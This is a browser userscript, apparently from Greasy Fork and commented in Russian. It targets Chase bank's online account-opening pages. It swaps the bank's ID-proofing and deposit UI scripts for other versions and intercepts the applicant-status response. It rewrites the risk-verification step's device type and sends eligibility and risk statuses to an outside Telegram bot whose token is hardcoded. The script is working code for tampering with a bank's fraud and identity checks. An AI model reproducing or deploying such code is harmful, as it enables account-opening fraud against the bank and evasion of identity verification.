// ==UserScript==
// @name         Replace scripts + intercept XHR POST
// @namespace    http://tampermonkey.net/
// @version      1.5
// @description  Заменяет скрипты по src и перехватывает XHR POST-запрос на статус заявок
// @match        *://*/*
// @grant        none
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/544724/Replace%20scripts%20%2B%20intercept%20XHR%20POST.user.js
// @updateURL https://update.greasyfork.org/scripts/544724/Replace%20scripts%20%2B%20intercept%20XHR%20POST.meta.js
// ==/UserScript==
 
(function() {
    'use strict';
 
    // --- Замена скриптов ---
 
    const replacements = [
        {
            from: '/aoa-consumer-deposits-ui/12.3.14/index.js',
            to: 'https://static.chasecdn.com/web/library/aoareact/aoa-consumer-deposits-ui/2.12.7/index.js'
        },
        {
            from: '/idproof/document-validation-ui/undefined/remoteEntry.js',
            to: 'https://static.chasecdn.com/web/library/idproof/document-validation-ui/2.56.1/remoteEntry.js'
        }
    ];
 
    function getReplacement(src) {
        for (const rep of replacements) {
            if (src.includes(rep.from)) {
                return rep.to;
            }
        }
        return null;
    }
 
    const originalAppendChild = Element.prototype.appendChild;
    Element.prototype.appendChild = function(node) {
        if (node.tagName === 'SCRIPT' && node.src) {
            const newSrc = getReplacement(node.src);
            if (newSrc) {
                console.log('[Tampermonkey] Replacing script src:', node.src, '->', newSrc);
                node.src = newSrc;
            }
        }
        return originalAppendChild.call(this, node);
    };
 
    const originalInsertBefore = Element.prototype.insertBefore;
    Element.prototype.insertBefore = function(newNode, referenceNode) {
        if (newNode.tagName === 'SCRIPT' && newNode.src) {
            const newSrc = getReplacement(newNode.src);
            if (newSrc) {
                console.log('[Tampermonkey] Replacing script src (insertBefore):', newNode.src, '->', newSrc);
                newNode.src = newSrc;
            }
        }
        return originalInsertBefore.call(this, newNode, referenceNode);
    };
 
    function replaceExistingScripts() {
        document.querySelectorAll('script[src]').forEach(script => {
            const newSrc = getReplacement(script.src);
            if (newSrc && script.src !== newSrc) {
                console.log('[Tampermonkey] Replacing existing script src:', script.src, '->', newSrc);
                script.src = newSrc;
            }
        });
    }
 
    if (document.readyState !== 'loading') {
        replaceExistingScripts();
    } else {
        document.addEventListener('DOMContentLoaded', replaceExistingScripts);
    }
 
    // --- Перехват XMLHttpRequest.open ---
 
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        if (url.includes("/svc/wr/oao/public/form/v3/applicant/status") && method.toUpperCase() === "POST") {
            this.addEventListener("readystatechange", function() {
                if (this.readyState === 4 && this.status === 200) {
                    try {
                        let responseObj = JSON.parse(this.responseText);
                        let eligibilityStatus = null;
                        let riskStatus = null;
                        if (Array.isArray(responseObj.stepCompletionStatus)) {
                            responseObj.stepCompletionStatus.forEach(step => {
                                if (step.stepName === "ELIGIBILITY_CHECK") {
                                    eligibilityStatus = step.statusName;
                                }
                                if (step.stepName === "RISK_VERIFICATION") {
                                    riskStatus = step.statusName;
                                    step.originalDeviceTypeName = "browser_computer";
                                }
                            });
                        }
                        const modifiedResponseText = JSON.stringify(responseObj);
                        Object.defineProperty(this, 'responseText', { get: () => modifiedResponseText });
                        Object.defineProperty(this, 'response', { get: () => modifiedResponseText });
 
                        // Отправляем в Telegram
                        let message = `Скрипт сработал PERSONAL для Сержика Годзиллы.\n`;
                        if (eligibilityStatus) message += `ELIGIBILITY_CHECK статус: ${eligibilityStatus}\n`;
                        if (riskStatus) message += `RISK_VERIFICATION статус: ${riskStatus}`;
 
                        const payload = {
                            chat_id: "-4575183996",
                            text: message
                        };
 
                        fetch("https://api.telegram.org/bot7288347645:AAGfaQnSum0rm9KAPK9FsShg-NaObmuRJYc/sendMessage", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(payload)
                        }).then(res => res.json())
                          .then(data => {
                              if (!data.ok) console.error("Ошибка отправки в Telegram:", data);
                          })
                          .catch(err => {
                              console.error("Ошибка при выполнении fetch:", err);
                          });
 
                    } catch (e) {
                        console.error("Ошибка при подмене ответа:", e);
                    }
                }
            }, false);
        }
        return originalXHROpen.apply(this, arguments);
    };
 
})();